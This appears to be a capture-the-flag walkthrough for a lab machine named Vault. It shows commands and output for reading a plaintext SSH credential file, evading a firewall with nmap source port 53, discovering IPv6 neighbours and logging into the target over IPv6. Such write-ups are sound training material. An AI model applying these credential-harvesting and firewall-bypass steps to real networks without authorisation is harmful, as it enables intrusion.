# 20 - DNS + Configurator


# Files
```bash
root@DNS:/home# find . -type f -ls
   531726      0 -rw-r--r--   1 alex     alex            0 Jul 17  2018 ./alex/.cache/motd.legal-displayed
   530462      4 -rw-r--r--   1 alex     alex          655 Jul 17  2018 ./alex/.profile
   531727      0 -rw-r--r--   1 alex     alex            0 Jul 17  2018 ./alex/.sudo_as_admin_successful
   533607      4 -rw-r--r--   1 alex     alex          222 Jul 17  2018 ./alex/.ssh/known_hosts
   533426      4 -rw-------   1 alex     alex          638 Jul 24  2018 ./alex/.bash_history
   531129      4 -rw-r--r--   1 alex     alex         3771 Jul 17  2018 ./alex/.bashrc
   531714      4 -rw-r--r--   1 alex     alex          220 Jul 17  2018 ./alex/.bash_logout
   279224      4 -rw-rw-r--   1 dave     dave           33 Sep  3  2018 ./dave/user.txt
   280304      0 -rw-------   1 dave     dave            0 Jul 17  2018 ./dave/.gnupg/pubring.gpg
   280301     12 -rw-------   1 dave     dave         9398 Jul 17  2018 ./dave/.gnupg/gpg.conf
   280303      0 -rw-------   1 dave     dave            0 Jul 17  2018 ./dave/.gnupg/secring.gpg
   280294      0 -rw-r--r--   1 dave     dave            0 Jul 17  2018 ./dave/.cache/motd.legal-displayed
   280290      4 -rw-r--r--   1 dave     dave          655 Jul 17  2018 ./dave/.profile
   280298      0 -rw-r--r--   1 dave     dave            0 Jul 17  2018 ./dave/.sudo_as_admin_successful
   280296      4 -rw-r--r--   1 dave     dave         1110 Sep  2  2018 ./dave/.ssh/known_hosts
   280297      4 -rw-------   1 dave     dave            5 Sep  3  2018 ./dave/.bash_history
   280305      4 -rw-r--r--   1 root     root           19 Jul 17  2018 ./dave/ssh
   280291      4 -rw-r--r--   1 dave     dave         3771 Jul 17  2018 ./dave/.bashrc
   280306      4 -rw-------   1 dave     dave           49 Sep  3  2018 ./dave/.Xauthority
   280292      4 -rw-r--r--   1 dave     dave          220 Jul 17  2018 ./dave/.bash_logout
```

# New SSH credentials
```bash
root@DNS:/home# cat ./dave/ssh
dave
dav3gerous567
```





# Vault's IP address
```bash
root@DNS:/var/www/html# cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       DNS
192.168.5.2     Vault
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

# IP route table
```bash
root@DNS:/var/www/html# ip route
192.168.5.0/24 via 192.168.122.5 dev ens3 
192.168.122.0/24 dev ens3  proto kernel  scope link  src 192.168.122.4 
```

192.168.5.0/24 subnet is routed via the firewall

# Nmap is installed on the box
```bash
root@DNS:/# which nmap
/usr/bin/nmap
root@DNS:/# cat DNS.nmap
# Nmap 7.01 scan initiated Fri Jul 16 09:58:51 2021 as: nmap -v -Pn -oA DNS 192.168.5.2
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0019s latency).
Not shown: 998 filtered ports
PORT     STATE  SERVICE
53/tcp   closed domain
4444/tcp closed krb524

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jul 16 09:59:07 2021 -- 1 IP address (1 host up) scanned in 15.86 seconds

```

* -Pn: `Do not send icmp, the server does not respond to ping requests`

Closed state mean the target server responds to Nmap probe packets but there is no application listening on it.
https://nmap.org/book/man-port-scanning-basics.html

This is interesting because we know that 192.168.122.5 is the firewall standing between us and Vault and we got 53 as closed. This may be a misconfiguration, instead of allowing forward requests to 53 they may have allowed `from 53 to any` and `from any to 53` as two different rules. If that is the case we can abuse it by setting our own source port number to 53.


```bash
root@DNS:/# cat DNS-53.nmap 
# Nmap 7.01 scan initiated Fri Jul 16 10:19:53 2021 as: nmap -Pn DNS --source-port 53 -oA DNS-53 192.168.5.2
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0036s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown

# Nmap done at Fri Jul 16 10:19:56 2021 -- 1 IP address (1 host up) scanned in 3.44 seconds
```

# SSH
```
root@DNS:/# nc -p53  192.168.5.2 987
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```


Unfortunately ssh doesn't have the option to specify a source port. There are ways to get around that. IPv6 can be tried


# IPv6 host discovery
```sql
root@DNS:/root# ip maddress                                                                    
1:      lo
        inet  224.0.0.1        
        inet6 ff02::1                                                                          
        inet6 ff01::1
2:      ens3    
        link  33:33:00:00:00:01
        link  01:00:5e:00:00:01
        link  33:33:ff:17:ab:49
        inet  224.0.0.1
        inet6 ff02::1:ff17:ab49
        inet6 ff02::1
        inet6 ff01::1
4:      tun0
        inet6 ff02::1
        inet6 ff01::1
```

Multicast address for all the nodes on ens3 is `ff01::1`

```bash
root@DNS:/root# ping6  -I ens3  ff02::1
PING ff02::1(ff02::1) from fe80::5054:ff:fe17:ab49 ens3: 56 data bytes
64 bytes from fe80::5054:ff:fe17:ab49: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from fe80::5054:ff:fec6:7066: icmp_seq=1 ttl=64 time=0.809 ms (DUP!)
64 bytes from fe80::5054:ff:fe3a:3bd5: icmp_seq=1 ttl=64 time=0.816 ms (DUP!)
64 bytes from fe80::5054:ff:fee1:7441: icmp_seq=1 ttl=64 time=1.18 ms (DUP!)
64 bytes from fe80::5054:ff:fe17:ab49: icmp_seq=2 ttl=64 time=0.062 ms
64 bytes from fe80::5054:ff:fec6:7066: icmp_seq=2 ttl=64 time=2.00 ms (DUP!)
64 bytes from fe80::5054:ff:fe3a:3bd5: icmp_seq=2 ttl=64 time=2.01 ms (DUP!)
64 bytes from fe80::5054:ff:fee1:7441: icmp_seq=2 ttl=64 time=2.51 ms (DUP!)
64 bytes from fe80::5054:ff:fe17:ab49: icmp_seq=3 ttl=64 time=0.064 ms
64 bytes from fe80::5054:ff:fec6:7066: icmp_seq=3 ttl=64 time=1.86 ms (DUP!)
64 bytes from fe80::5054:ff:fe3a:3bd5: icmp_seq=3 ttl=64 time=1.87 ms (DUP!)
64 bytes from fe80::5054:ff:fee1:7441: icmp_seq=3 ttl=64 time=2.95 ms (DUP!)
```

# ip neighbor & ssh

Shows the current neighbour table in kernel.
```bash
root@DNS:/root# ip neigh
192.168.122.1 dev ens3 lladdr fe:54:00:17:ab:49 REACHABLE
fe80::5054:ff:fec6:7066 dev ens3 lladdr 52:54:00:c6:70:66 REACHABLE
fe80::5054:ff:fee1:7441 dev ens3 lladdr 52:54:00:e1:74:41 STALE
fe80::5054:ff:fe3a:3bd5 dev ens3 lladdr 52:54:00:3a:3b:d5 STALE
root@DNS:/root# cat /home/dave/ssh
dave
dav3gerous567
root@DNS:/root# ssh  -6 -l dave fe80::5054:ff:fec6:7066%ens3 -p987
dave@fe80::5054:ff:fec6:7066%ens3's password: dav3gerous567
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.


Last login: Fri Jul 16 13:30:08 2021 from fe80::5054:ff:fe17:ab49%ens3
dave@vault:~$ 

```
